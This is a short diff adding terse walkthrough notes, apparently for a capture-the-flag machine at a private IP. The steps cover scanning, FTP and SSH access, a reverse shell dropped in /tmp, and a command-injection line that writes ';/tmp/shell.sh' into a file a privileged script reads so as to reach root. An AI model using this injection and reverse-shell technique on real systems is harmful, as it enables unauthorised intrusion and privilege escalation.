@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.50.35
+2 - ftp 10.10.50.35
+3 - echo "hash" | base64 -d -> VIGENERE
+4 - ssh weston@10.10.50.35
+5 - sudo -l
+6 - reverse shell -> /tmp/x.sh
+7 - echo 'aa;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
+8 - cat Super_Duper_Checklist
+9 - ls email_backup
+10 - VIGENERE
+11 - su root
+12 - cd email_backup
+
